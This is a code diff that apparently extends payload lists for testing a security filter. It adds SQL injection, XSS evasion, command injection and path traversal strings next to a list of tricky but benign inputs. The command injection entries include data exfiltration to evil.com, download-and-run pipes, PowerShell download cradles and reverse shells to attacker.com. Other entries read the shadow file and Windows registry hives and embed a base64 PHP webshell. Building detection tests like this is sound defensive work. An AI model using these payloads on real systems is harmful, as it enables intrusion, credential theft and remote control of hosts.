@@ -98,6 +98,24 @@ SQLI_PAYLOADS = [
     "'/**/OR/**/1=1--",
     "' /*!UNION*/ /*!SELECT*/ 1,2,3 --",
     "' OR/**/ 1=1 --",
+
+    # Advanced SQLi / WAF bypass
+    "' /*!50000UNION*/ SELECT 1,2,3 --",
+    "' AND 1=1 ORDER BY 1 --",
+    "' ORDER BY 1,2,3,4 --",
+    "1') AND 1=1 --",
+    "' AND (SELECT * FROM (SELECT SLEEP(5))a) --",
+    "admin' AND 1=1 --",
+    "' OR 'a'='a",
+    "' OR 'x'='x' --",
+    "'; DECLARE @x NVARCHAR(100); SET @x=''; EXEC(@x) --",
+    "1'; EXEC xp_cmdshell('net user') --",
+    "'; SELECT * FROM information_schema.tables WHERE 1=1 --",
+    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()))) --",
+    "' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x00 END)) --",
+    "1 AND 1=1 UNION SELECT 1,2,3,group_concat(username) FROM users --",
+    "')) OR 1=1 --",
+    "' UNION SELECT username,password FROM users LIMIT 1 --",
 ]
 
 # ============================================================
@@ -185,6 +203,23 @@ XSS_PAYLOADS = [
     '"><img src=x onerror=alert(1)>',
     "'-alert(1)-'",
     '"><svg/onload=alert(1)>',
+
+    # Advanced XSS evasion
+    '<scr<script>ipt>alert(1)</scr</script>ipt>',
+    '<img src=x:alert onerror=eval(src)>',
+    '<body/onload=alert(1)>',
+    '<input/onfocus=alert(1) autofocus>',
+    '<marquee/onstart=confirm(1)>',
+    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
+    '<svg><a><animate attributeName=href values=javascript:alert(1)>',
+    '<math><maction actiontype=statusline xlink:href=javascript:alert(1)>',
+    '<form><button formaction=javascript:alert(1)>click',
+    '<isindex type=image src=1 onerror=alert(1)>',
+    '<video><source onerror=alert(1)>',
+    '<details open ontoggle=alert(1)>test</details>',
+    '<audio src onerror=alert(1)>',
+    '{{constructor.constructor("alert(1)")()}}',
+    '<img src=x onerror=alert`1`>',
 ]
 
 # ============================================================
@@ -284,6 +319,34 @@ CMDI_PAYLOADS = [
     "; ls; whoami; id",
     "| ls && whoami",
     "`ls` && `whoami`",
+
+    # Advanced CMDI / Filter bypass
+    ";{ls,-la}",
+    ";{cat,/etc/passwd}",
+    "${IFS}ls",
+    ";ls${IFS}-la",
+    ";cat${IFS}/etc/passwd",
+    "|rev<<<'dwssap/cte/ tac'",
+    ";echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash",
+    ";a]b]c]d=whoami;$a]b]c]d",
+    "$(printf '\\x63\\x61\\x74 /etc/passwd')",
+    "$'\\x63\\x61\\x74' /etc/passwd",
+    ";w]h]o]a]m]i=whoami;$w]h]o]a]m]i",
+    "%0a ping -c 3 127.0.0.1",
+    "; ping -n 3 127.0.0.1",
+    "& nslookup attacker.com",
+    "; curl http://evil.com/exfil?data=$(cat /etc/passwd)",
+    "| wget -O- http://evil.com/shell.sh | bash",
+    "& powershell -enc SQBuAHYAbwBrAGUA",
+    "& powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps1')\"",
+    "| python3 -c 'import os;os.system(\"id\")'",
+    "; perl -e 'system(\"whoami\")'",
+    "; ruby -e '`whoami`'",
+    "&& nc -e /bin/sh attacker.com 4444",
+    "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+    "$(touch /tmp/pwned)",
+    "; chmod 777 /etc/shadow",
+    "& certutil -urlcache -split -f http://evil.com/shell.exe C:\\shell.exe",
 ]
 
 # ============================================================
@@ -355,6 +418,29 @@ PATH_TRAVERSAL_PAYLOADS = [
     "file:///etc/passwd",
     "file:///c:/windows/win.ini",
     "php://filter/convert.base64-encode/resource=../../../etc/passwd",
+
+    # Advanced Path Traversal / Filter bypass
+    "....//....//....//etc/shadow",
+    "..;/..;/..;/etc/shadow",
+    "..\\..\\..\\..\\..\\..\\/etc/passwd",
+    "..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd",
+    "..%c0%ae..%c0%ae..%c0%aeetc/passwd",
+    "..%bg%qf..%bg%qf..%bg%qfetc/passwd",
+    "/var/www/../../etc/passwd",
+    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "php://filter/read=string.rot13/resource=../../../etc/passwd",
+    "php://input",
+    "expect://id",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+    "zip://shell.jpg%23payload.php",
+    "phar://uploads/avatar.jpg/shell.php",
+    "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
+    "..\\..\\..\\..\\windows\\system32\\config\\SYSTEM",
+    "..\\..\\..\\..\\windows\\system32\\config\\SOFTWARE",
+    "..%5c..%5c..%5c..%5cinetpub%5cwwwroot%5cweb.config",
+    "/proc/self/cmdline",
+    "/proc/self/fd/0",
+    "/proc/self/status",
 ]
 
 # ============================================================
@@ -467,6 +553,23 @@ SAFE_PAYLOADS = [
     "The <title> tag defines the page title",
     "Read the README.md file for instructions",
     "Use 'single quotes' for strings in Python",
+
+    # More edge cases — tricky but safe
+    "The OR gate outputs 1 when any input is 1",
+    "UNION workers demand fair wages",
+    "Please SELECT a category from the menu",
+    "The DROP down menu is not working",
+    "INSERT coin to continue",
+    "Users can UPDATE their profile picture",
+    "Click DELETE to remove the item from cart",
+    "The table has 3 columns and 5 rows",
+    "Configuration file at /etc/app/config.yml",
+    "Navigate to C:\\Program Files\\MyApp\\settings",
+    "The <b>bold</b> text is used for emphasis",
+    "Add an onclick handler for the button",
+    "The script element loads external resources",
+    "Use eval() carefully in JavaScript",
+    "Pipe the output to grep: ls | grep txt",
 ]
 
 
